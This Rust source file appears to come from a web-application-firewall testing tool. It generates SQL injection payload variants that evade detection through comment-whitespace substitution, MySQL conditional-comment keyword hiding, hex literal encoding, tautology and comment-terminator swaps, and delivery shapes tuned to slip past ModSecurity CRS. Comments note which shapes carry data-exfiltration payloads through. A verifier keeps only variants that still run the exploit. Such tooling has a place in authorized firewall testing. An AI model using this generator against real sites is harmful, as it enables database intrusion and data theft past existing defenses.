//! SQL payload-string equivalence rewrite system + the joint
//! `(payload × delivery)` generator. Every rewrite is
//! semantic-preserving by construction; the generator additionally
//! re-verifies each member with [`still_executes`] so it is sound by
//! construction AND checked — it can never emit a non-attack.

use super::{DeliveryShape, Dialect, EquivConfig, EquivPayload, Rng};
use crate::grammar::sql::is_structured_attack;

// ── Token model ────────────────────────────────────────────────────
// Injection payloads are NOT standalone SQL — the leading `'`/`"` is a
// *context break* out of the host query's string literal, not a
// literal delimiter. So quotes are `Sym`, and `OR`/`UNION`/`1=1` are
// top-level tokens the rewrites can actually reach.
#[derive(Debug, Clone, PartialEq, Eq)]
enum Tok {
    /// Whitespace / block-comment run (a separator).
    Ws(String),
    /// Numeric literal (decimal / `0x..` / scientific).
    Num(String),
    /// Identifier or keyword run.
    Word(String),
    /// Any other single character (operator / punctuation / quote).
    Sym(char),
}

fn tokenize(s: &str) -> Vec<Tok> {
    let b: Vec<char> = s.chars().collect();
    let mut out = Vec::new();
    let mut i = 0;
    while i < b.len() {
        let c = b[i];
        if c.is_whitespace() {
            let mut w = String::new();
            while i < b.len() && b[i].is_whitespace() {
                w.push(b[i]);
                i += 1;
            }
            out.push(Tok::Ws(w));
        } else if c == '/' && i + 1 < b.len() && b[i + 1] == '*' {
            // Block comment = separator.
            let mut w = String::from("/*");
            i += 2;
            while i < b.len() && !(b[i] == '*' && i + 1 < b.len() && b[i + 1] == '/') {
                w.push(b[i]);
                i += 1;
            }
            if i + 1 < b.len() {
                w.push_str("*/");
                i += 2;
            }
            out.push(Tok::Ws(w));
        } else if c.is_ascii_digit()
            || (c == '0' && i + 1 < b.len() && (b[i + 1] == 'x' || b[i + 1] == 'X'))
        {
            let mut n = String::new();
            if c == '0' && i + 1 < b.len() && (b[i + 1] == 'x' || b[i + 1] == 'X') {
                n.push('0');
                n.push(b[i + 1]);
                i += 2;
                while i < b.len() && b[i].is_ascii_hexdigit() {
                    n.push(b[i]);
                    i += 1;
                }
            } else {
                while i < b.len()
                    && (b[i].is_ascii_digit()
                        || b[i] == '.'
                        || b[i] == 'e'
                        || b[i] == 'E'
                        || ((b[i] == '+' || b[i] == '-')
                            && !n.is_empty()
                            && matches!(n.chars().last(), Some('e' | 'E'))))
                {
                    n.push(b[i]);
                    i += 1;
                }
            }
            out.push(Tok::Num(n));
        } else if c.is_alphabetic() || c == '_' {
            let mut w = String::new();
            while i < b.len() && (b[i].is_alphanumeric() || b[i] == '_') {
                w.push(b[i]);
                i += 1;
            }
            out.push(Tok::Word(w));
        } else {
            out.push(Tok::Sym(c));
            i += 1;
        }
    }
    out
}

/// Test/inspection helper: lossless tokenize→render round-trip.
#[must_use]
pub fn round_trip(s: &str) -> String {
    render(&tokenize(s))
}

/// Test helper: one sampled provably-true expression for `seed`.
#[doc(hidden)]
#[must_use]
pub fn _sample_truth(seed: u64) -> String {
    gen_true(&mut Rng::new(seed), 0)
}

/// Test helper: one sampled provably-false expression for `seed`.
#[doc(hidden)]
#[must_use]
pub fn _sample_false(seed: u64) -> String {
    gen_false(&mut Rng::new(seed), 0)
}

/// Test/inspection helper: the WAF+DB-equivalent normalisation
/// (comments stripped, whitespace collapsed, lowercased).
#[must_use]
pub fn normalize_pub(s: &str) -> String {
    normalize(s)
}

fn render(toks: &[Tok]) -> String {
    let mut s = String::new();
    for t in toks {
        match t {
            Tok::Ws(w) => s.push_str(w),
            Tok::Num(n) | Tok::Word(n) => s.push_str(n),
            Tok::Sym(c) => s.push(*c),
        }
    }
    s
}

// ── Whitespace-equivalent language (sound separators) ───────────────
// Each is parsed purely as a token separator by MySQL/Postgres/MSSQL.
// `/*!*/` / `/*!50000*/` emit nothing → whitespace on MySQL and are
// ordinary comments (= whitespace) elsewhere, so they are generically
// sound separators that defeat regex that doesn't strip MySQL
// conditional comments.
const WS_EQUIV: &[&str] = &[
    " ",
    "  ",
    "\t",
    "\n",
    "\r\n",
    "\x0c",
    "\x0b",
    "/**/",
    "/**//**/",
    " /**/ ",
    "\t/**/\t",
    "/*!*/",
    "/*!50000*/",
    "\n\t",
    "/*x*/",
];

fn ws_pick(rng: &mut Rng) -> String {
    (*rng.pick(WS_EQUIV)).to_string()
}

// ── Provably-true / provably-false expression grammar ───────────────
// Constructed so the boolean value is fixed by the construction rule;
// operators restricted to the dialect-generic-sound set.
fn gen_true(rng: &mut Rng, depth: u8) -> String {
    if depth >= 3 || rng.chance(3, 5) {
        let a = 1 + rng.below(98) as i64;
        match rng.below(11) {
            0 => format!("{a}={a}"),
            1 => {
                let b = a + 1 + rng.below(50) as i64;
                format!("{a}<{b}")
            }
            2 => {
                let b = a + 1 + rng.below(50) as i64;
                format!("{b}>{a}")
            }
            3 => format!("{a}<={a}"),
            4 => format!("{a}>={a}"),
            5 => {
                let b = a + 1 + rng.below(9) as i64;
                format!("{a}!={b}")
            }
            6 => {
                let b = a + 1 + rng.below(9) as i64;
                format!("{a}<>{b}")
            }
            7 => {
                let s = rand_ident(rng);
                format!("'{s}'='{s}'")
            }
            8 => format!("{a} LIKE {a}"),
            9 => format!("{a} BETWEEN {a} AND {a}"),
            _ => format!("{a}|0={a}"),
        }
    } else {
        match rng.below(4) {
            0 => format!(
                "({}) OR ({})",
                gen_true(rng, depth + 1),
                gen_false(rng, depth + 1)
            ),
            1 => format!(
                "({}) AND ({})",
                gen_true(rng, depth + 1),
                gen_true(rng, depth + 1)
            ),
            2 => format!("NOT ({})", gen_false(rng, depth + 1)),
            _ => format!("({})", gen_true(rng, depth + 1)),
        }
    }
}

fn gen_false(rng: &mut Rng, depth: u8) -> String {
    if depth >= 3 || rng.chance(3, 5) {
        let a = 1 + rng.below(98) as i64;
        match rng.below(5) {
            0 => {
                let b = a + 1 + rng.below(9) as i64;
                format!("{a}={b}")
            }
            1 => format!("{a}>{a}"),
            2 => format!("{a}<{a}"),
            3 => {
                let s = rand_ident(rng);
                let t = rand_ident(rng);
                format!("'{s}'='{t}{s}'")
            }
            _ => format!("{a}!={a}"),
        }
    } else {
        match rng.below(3) {
            0 => format!(
                "({}) AND ({})",
                gen_true(rng, depth + 1),
                gen_false(rng, depth + 1)
            ),
            1 => format!("NOT ({})", gen_true(rng, depth + 1)),
            _ => format!("({})", gen_false(rng, depth + 1)),
        }
    }
}

fn rand_ident(rng: &mut Rng) -> String {
    const A: &[u8] = b"abcdefghijklmnopqrstuvwxyz";
    let n = 2 + rng.below(5);
    (0..n).map(|_| A[rng.below(26)] as char).collect()
}

// ── Soundness verifier ─────────────────────────────────────────────
fn normalize(s: &str) -> String {
    // Strip comments, collapse ws, lowercase — what a DB + a
    // WAF-normalizer effectively see; comment-split keywords fold back.
    let mut out = String::with_capacity(s.len());
    let bytes: Vec<char> = s.chars().collect();
    let mut i = 0;
    while i < bytes.len() {
        if bytes[i] == '/' && i + 1 < bytes.len() && bytes[i + 1] == '*' {
            if i + 2 < bytes.len() && bytes[i + 2] == '!' {
                // MySQL conditional comment `/*![ver] … */`: the body
                // is LIVE code on MySQL. Keep it (drop the `/*!`,
                // optional version digits, and `*/`) so a keyword
                // hidden in one folds back to the keyword for the
                // verifier instead of vanishing.
                i += 3;
                while i < bytes.len() && bytes[i].is_ascii_digit() {
                    i += 1;
                }
                while i + 1 < bytes.len() && !(bytes[i] == '*' && bytes[i + 1] == '/') {
                    out.push(bytes[i].to_ascii_lowercase());
                    i += 1;
                }
                i += 2;
            } else {
                // Plain `/* … */` = a token separator (whitespace).
                i += 2;
                while i + 1 < bytes.len() && !(bytes[i] == '*' && bytes[i + 1] == '/') {
                    i += 1;
                }
                i += 2;
                out.push(' ');
            }
        } else if (bytes[i] == '-' && i + 1 < bytes.len() && bytes[i + 1] == '-') || bytes[i] == '#'
        {
            // line comment (`-- …` or `# …`) — skip to newline.
            while i < bytes.len() && bytes[i] != '\n' {
                i += 1;
            }
        } else {
            out.push(bytes[i].to_ascii_lowercase());
            i += 1;
        }
    }
    out.split_whitespace().collect::<Vec<_>>().join(" ")
}

fn sig_tokens(norm: &str) -> Vec<String> {
    norm.split(|c: char| !c.is_ascii_alphanumeric())
        .filter(|t| t.len() >= 4 && t.chars().any(|c| c.is_ascii_alphabetic()))
        .map(str::to_string)
        .collect()
}

/// True iff `cand` provably still executes the original exploit.
///
/// Structured attack (UNION/exfil/error-based/stacked/blind): every
/// structural significant token of the original must survive
/// normalisation in `cand`. Non-structured (tautology / auth-bypass):
/// the context-break and a boolean construct must survive. Empty /
/// degenerate ⇒ rejected.
#[must_use]
pub fn still_executes(original: &str, cand: &str) -> bool {
    if cand.trim().is_empty() {
        return false;
    }
    let no = normalize(original);
    let nc = normalize(cand);
    if is_structured_attack(original) {
        let want = sig_tokens(&no);
        if want.is_empty() {
            return !nc.is_empty();
        }
        // EVERY structural token of the original must remain.
        want.iter().all(|t| nc.contains(t.as_str()))
    } else {
        // Auth-bypass / tautology. Valid iff a context break (quote /
        // paren / logical operator) survives AND the exploit mechanism
        // survives — either a boolean condition OR a comment-terminator
        // (the `admin'--` class: close the literal, comment out the
        // password check; it has NO boolean and is still a real bypass).
        let has_break = cand.contains('\'')
            || cand.contains('"')
            || cand.contains(')')
            || nc.contains(" or ")
            || nc.contains(" and ")
            || nc.starts_with("or ")
            || nc.starts_with("and ");
        let has_bool = nc.contains('=')
            || nc.contains('<')
            || nc.contains('>')
            || nc.contains(" like ")
            || nc.contains(" between ")
            || nc.contains(" in ")
            || nc.contains(" is ");
        let has_terminator = cand.contains("--") || cand.contains('#') || cand.contains("/*");
        // The original's mechanism must be preserved, not weakened:
        // if the original had a boolean, the candidate must keep one;
        // if it was comment-only, a terminator must remain.
        let orig_bool = no.contains('=')
            || no.contains('<')
            || no.contains('>')
            || no.contains(" like ")
            || no.contains(" between ")
            || no.contains(" in ")
            || no.contains(" is ");
        if orig_bool {
            has_break && has_bool
        } else {
            has_break && (has_bool || has_terminator)
        }
    }
}

// ── Rewrites ───────────────────────────────────────────────────────
const SQL_KEYWORDS: &[&str] = &[
    "union",
    "select",
    "from",
    "where",
    "and",
    "or",
    "not",
    "order",
    "by",
    "group",
    "having",
    "limit",
    "into",
    "outfile",
    "dumpfile",
    "load_file",
    "extractvalue",
    "updatexml",
    "concat",
    "version",
    "user",
    "database",
    "sleep",
    "benchmark",
    "case",
    "when",
    "then",
    "else",
    "end",
    "like",
    "between",
    "exists",
    "all",
    "any",
    "distinct",
    "drop",
    "insert",
    "update",
    "delete",
    "table",
    "values",
    "set",
    "procedure",
    "if",
];

fn is_kw(w: &str) -> bool {
    let lw = w.to_ascii_lowercase();
    SQL_KEYWORDS.contains(&lw.as_str())
}

/// Replace every separator with a sampled WS-equivalent.
fn rw_whitespace(toks: &mut [Tok], rng: &mut Rng) -> bool {
    let mut hit = false;
    for t in toks.iter_mut() {
        if let Tok::Ws(_) = t {
            *t = Tok::Ws(ws_pick(rng));
            hit = true;
        }
    }
    hit
}

/// Split / case-permute keyword Words. Equivalence holds at the SQL
/// parser (comments fold out, SQL keywords are case-insensitive);
/// surviving the WAF normalizer is Phase C's selection job.
// SOUND keyword evasions only. The classic `UN/**/ION` is NOT sound —
// a comment is a *token separator* in SQL, so it SPLITS the keyword
// into two identifiers rather than gluing it (the verifier rejected
// those anyway; emitting them was wasted work and conceptually wrong).
// What IS sound:
//   * case permutation — SQL keywords are case-insensitive (Generic);
//   * `/*!ver KW */` MySQL conditional comment — the keyword executes
//     on MySQL (so the variant is tagged `MySql`, never claimed
//     dialect-generic).
fn rw_keyword(toks: &mut [Tok], rng: &mut Rng, dialect: &mut Dialect) -> bool {
    let mut hit = false;
    for t in toks.iter_mut() {
        if let Tok::Word(w) = t
            && is_kw(w)
            && w.len() >= 2
            && rng.chance(1, 2)
        {
            let chosen = match rng.below(3) {
                0 => w
                    .chars()
                    .enumerate()
                    .map(|(k, c)| {
                        if k % 2 == 0 {
                            c.to_ascii_uppercase()
                        } else {
                            c.to_ascii_lowercase()
                        }
                    })
                    .collect(),
                1 => {
                    *dialect = promote(*dialect, Dialect::MySql);
                    format!("/*!{w}*/")
                }
                _ => {
                    *dialect = promote(*dialect, Dialect::MySql);
                    format!("/*!50000{w}*/")
                }
            };
            *t = Tok::Word(chosen);
            hit = true;
        }
    }
    hit
}

/// Re-encode numeric/string literals to value-equivalent forms.
fn rw_literal(toks: &mut [Tok], rng: &mut Rng, dialect: &mut Dialect) -> bool {
    let mut hit = false;
    for t in toks.iter_mut() {
        if let Tok::Num(n) = t
            && let Ok(v) = n.parse::<i64>()
            && v >= 0
            && rng.chance(1, 2)
        {
            *t = match rng.below(3) {
                0 => {
                    *dialect = promote(*dialect, Dialect::MySql);
                    Tok::Num(format!("0x{v:x}"))
                }
                1 => Tok::Num(format!("{v}e0")),
                _ => Tok::Num(format!("({v})")),
            };
            hit = true;
        }
    }
    hit
}

fn promote(a: Dialect, b: Dialect) -> Dialect {
    if a == Dialect::Generic { b } else { a }
}

/// String-level: swap a recognised boolean-tautology *atom* for a
/// freshly-generated provably-true expression. ONLY for non-structured
/// payloads (never touch an exfil/error-based core — the in-generator
/// anti-rig invariant). Conservative: only well-formed tautology atoms
/// are swapped, and the surrounding break/comment context is kept, so
/// the result is sound by construction (and [`still_executes`]
/// re-verifies it independently).
fn rw_tautology(payload: &str, s: &str, rng: &mut Rng) -> Option<String> {
    if is_structured_attack(payload) {
        return None;
    }
    // Recognised tautology atoms, longest/most-specific first.
    const ATOMS: &[&str] = &[
        "'1'='1'",
        "'1' = '1'",
        "'a'='a'",
        "'x'='x'",
        "'1'='1",
        "\"1\"=\"1\"",
        "1=1",
        "1 = 1",
        "2=2",
        "0=0",
        "1=1#",
        "1=1-- ",
        " OR TRUE",
        "=true",
        "1 like 1",
        "1 LIKE 1",
    ];
    let lower = s.to_ascii_lowercase();
    let mut best: Option<(usize, &str)> = None;
    for a in ATOMS {
        if let Some(pos) = lower.find(a.to_ascii_lowercase().as_str()) {
            let take = match best {
                None => true,
                Some((p, prev)) => pos < p || (pos == p && a.len() > prev.len()),
            };
            if take {
                best = Some((pos, a));
            }
        }
    }
    let (pos, atom) = best?;
    let truth = gen_true(rng, 0);
    let mut out = String::with_capacity(s.len() + truth.len());
    out.push_str(&s[..pos]);
    out.push('(');
    out.push_str(&truth);
    out.push(')');
    out.push_str(&s[pos + atom.len()..]);
    Some(out)
}

/// Wrap a region in redundant parentheses / double negation
/// (semantic-preserving boolean identities).
fn rw_paren(toks: &mut Vec<Tok>, rng: &mut Rng) -> bool {
    if toks.len() < 2 || !rng.chance(1, 2) {
        return false;
    }
    // Find the first logical operator and parenthesise its right
    // operand. The closing `)` must go BEFORE any trailing comment
    // terminator (`--` / `#`) — appending it at the absolute end would
    // bury it inside the comment, leaving the `(` unmatched and the
    // query a syntax error (an unsound emission).
    for i in 0..toks.len() {
        if let Tok::Word(w) = &toks[i]
            && matches!(w.to_ascii_lowercase().as_str(), "or" | "and")
            && i + 2 < toks.len()
        {
            let open = i + 1;
            // first terminator at/after `open`: `#` or `--`.
            let mut close = toks.len();
            let mut j = open;
            while j < toks.len() {
                let term = matches!(toks[j], Tok::Sym('#'))
                    || (matches!(toks[j], Tok::Sym('-'))
                        && j + 1 < toks.len()
                        && matches!(toks[j + 1], Tok::Sym('-')));
                if term {
                    close = j;
                    break;
                }
                j += 1;
            }
            if close <= open {
                return false;
            }
            toks.insert(close, Tok::Sym(')'));
            toks.insert(open, Tok::Sym('('));
            return true;
        }
    }
    false
}

/// Swap a trailing comment terminator for an equivalent one
/// (`-- -` ≡ `#` ≡ `-- <rand>` — all comment to end-of-input). Gives
/// entropy to comment-only auth bypasses with no other surface.
fn rw_terminator(s: &str, rng: &mut Rng) -> Option<String> {
    let trimmed = s.trim_end();
    let body = if let Some(b) = trimmed.strip_suffix("-- -") {
        b
    } else if let Some(b) = trimmed.strip_suffix("-- ") {
        b
    } else if let Some(b) = trimmed.strip_suffix("--") {
        b
    } else {
        trimmed.strip_suffix('#')?
    };
    let tail = rand_ident(rng);
    let repl = match rng.below(6) {
        0 => "-- -".to_string(),
        1 => format!("-- {tail}"),
        2 => "#".to_string(),
        3 => format!("#{tail}"),
        4 => "-- \t-".to_string(),
        _ => format!("-- -{tail}"),
    };
    Some(format!("{body}{repl}"))
}

/// Insert an equivalent separator at SQL-whitespace-optional
/// boundaries (around operators / parens / commas, between adjacent
/// keyword words). NEVER next to a break-quote or between a word and a
/// quote — that would change the injected literal's value. Sound by
/// the boundary predicate.
fn rw_insert_sep(toks: &mut Vec<Tok>, rng: &mut Rng) -> bool {
    let op = |t: &Tok| {
        matches!(
            t,
            Tok::Sym('=' | '<' | '>' | '(' | ')' | ',' | '|' | '^' | '!')
        )
    };
    let mut inserts: Vec<usize> = Vec::new();
    for i in 0..toks.len().saturating_sub(1) {
        let a = &toks[i];
        let b = &toks[i + 1];
        if matches!(a, Tok::Ws(_)) || matches!(b, Tok::Ws(_)) {
            continue;
        }
        let safe = op(a)
            || op(b)
            || (matches!(a, Tok::Word(_)) && matches!(b, Tok::Word(_)))
            || (matches!(a, Tok::Word(_)) && matches!(b, Tok::Sym('(')));
        if safe && rng.chance(1, 2) {
            inserts.push(i + 1);
        }
    }
    if inserts.is_empty() {
        return false;
    }
    for (shift, pos) in inserts.into_iter().enumerate() {
        toks.insert(pos + shift, Tok::Ws(ws_pick(rng)));
    }
    true
}

// ── DeliveryShape shapes (the joint algebra) ─────────────────────────────
// Empirically-strong-first against modsec CRS PL1 (multipart-file and
// path-segment carry STRUCTURED exfil straight through).
/// Number of delivery-shape arms (index space for `force_delivery` /
/// the Phase-C bandit). MUST equal `delivery_set(..).len()` — pinned
/// by `delivery_api_tests::phase_c_arm_table_is_aligned_injective_
/// and_tail_stable`. (8 → 10 in 0.2.17: the bandit must explore the
/// new `header_value` / `cookie` arms or they are dead in the
/// adaptive scan path.)
pub const DELIVERY_ARMS: usize = 10;

/// Stable label for delivery-shape arm `i` (matches `delivery_set`
/// order). Out-of-range ⇒ "query".
#[must_use]
pub fn delivery_kind_label(i: usize) -> &'static str {
    match i {
        0 => "multipart_file",
        1 => "path_segment",
        2 => "hpp_split",
        3 => "json_no_ct",
        4 => "json_ct",
        5 => "multipart_field",
        6 => "form_body",
        7 => "query",
        8 => "header_value",
        9 => "cookie",
        _ => "query",
    }
}

pub(crate) fn delivery_set(param: &str) -> Vec<DeliveryShape> {
    vec![
        DeliveryShape::MultipartFile {
            name: param.to_string(),
            filename: "a.txt".to_string(),
            part_ct: "application/octet-stream".to_string(),
        },
        DeliveryShape::PathSegment,
        DeliveryShape::HppSplit {
            param: param.to_string(),
            parts: 2,
        },
        DeliveryShape::JsonBody {
            param: param.to_string(),
            content_type: None,
        },
        DeliveryShape::JsonBody {
            param: param.to_string(),
            content_type: Some("application/json".to_string()),
        },
        DeliveryShape::MultipartField {
            name: param.to_string(),
        },
        DeliveryShape::FormBody {
            param: param.to_string(),
        },
        DeliveryShape::Query {
            param: param.to_string(),
        },
        // Raw reflected channels — CRS covers REQUEST_HEADERS /
        // REQUEST_COOKIES weaker than ARGS at PL1. Sound only for
        // transport-legal payloads; the generator filters per
        // `DeliveryShape::transport_legal`.
        DeliveryShape::HeaderValue {
            name: "X-Forwarded-Host".to_string(),
        },
        DeliveryShape::Cookie {
            name: param.to_string(),
        },
    ]
}

/// Draw up to `cfg.max` members of the joint equivalence class.
/// Deterministic per `cfg.seed`; every member structurally verified.
#[must_use]
pub fn generate(payload: &str, cfg: &EquivConfig) -> Vec<EquivPayload> {
    let mut rng = Rng::new(cfg.seed);
    let base = tokenize(payload);
    let all_deliveries = delivery_set(&cfg.param);
    // Phase C: when the adaptive search forces an arm, restrict the
    // whole generation to that one delivery shape so the request
    // budget concentrates on what beats THIS WAF.
    let (deliveries, single_forced) = match cfg.force_delivery {
        Some(i) if i < all_deliveries.len() => (vec![all_deliveries[i].clone()], true),
        _ => (all_deliveries, false),
    };
    let mut seen: std::collections::HashSet<String> = std::collections::HashSet::new();
    let mut out: Vec<EquivPayload> = Vec::new();

    // The original must itself be a valid attack — the generator can
    // only preserve an exploit that exists, never manufacture one from
    // junk. (Anti-rig: a non-attack in ⇒ nothing out.)
    if !still_executes(payload, payload) {
        return out;
    }

    // Seed 1: identity payload across every delivery shape — even with
    // zero string rewrites, multipart-file / path-segment / hpp-split
    // carry the *unmodified structured exploit* past CRS (empirical).
    for d in &deliveries {
        if !cfg.vary_delivery && !single_forced && !matches!(d, DeliveryShape::Query { .. }) {
            continue;
        }
        let key = format!("{}\u{1}{}", payload, d.label());
        if seen.insert(key) {
            out.push(EquivPayload {
                payload: payload.to_string(),
                delivery: d.clone(),
                dialect: Dialect::Generic,
                rules: vec!["identity"],
            });
        }
    }

    // Seed 2: sampled payload-string rewrites × delivery.
    let mut attempts = 0;
    while out.len() < cfg.max && attempts < cfg.max * 24 + 64 {
        attempts += 1;
        let mut toks = base.clone();
        let mut dialect = Dialect::Generic;
        let mut rules: Vec<&'static str> = Vec::new();

        if rng.chance(4, 5) && rw_whitespace(&mut toks, &mut rng) {
            rules.push("ws_equiv");
        }
        if rng.chance(3, 5) && rw_keyword(&mut toks, &mut rng, &mut dialect) {
            rules.push("keyword_morph");
        }
        if rng.chance(1, 2) && rw_literal(&mut toks, &mut rng, &mut dialect) {
            rules.push("literal_encode");
        }
        if rng.chance(1, 4) && rw_paren(&mut toks, &mut rng) {
            rules.push("paren_identity");
        }
        if rng.chance(3, 5) && rw_insert_sep(&mut toks, &mut rng) {
            rules.push("sep_inject");
        }
        let mut rendered = render(&toks);
        if rng.chance(2, 5)
            && let Some(t) = rw_tautology(payload, &rendered, &mut rng)
        {
            rendered = t;
            rules.push("tautology_gen");
        }
        if rng.chance(1, 2)
            && let Some(t) = rw_terminator(&rendered, &mut rng)
        {
            rendered = t;
            rules.push("terminator_equiv");
        }
        if rules.is_empty() {
            continue;
        }
        if !still_executes(payload, &rendered) {
            continue; // sound-by-construction AND verified
        }
        let d = if cfg.vary_delivery || single_forced {
            rng.pick(&deliveries).clone()
        } else {
            DeliveryShape::Query {
                param: cfg.param.clone(),
            }
        };
        let key = format!("{}\u{1}{}", rendered, d.label());
        if !seen.insert(key) {
            continue;
        }
        out.push(EquivPayload {
            payload: rendered,
            delivery: d,
            dialect,
            rules,
        });
    }
    super::enforce_transport_legal(&mut out);
    out.truncate(cfg.max);
    out
}
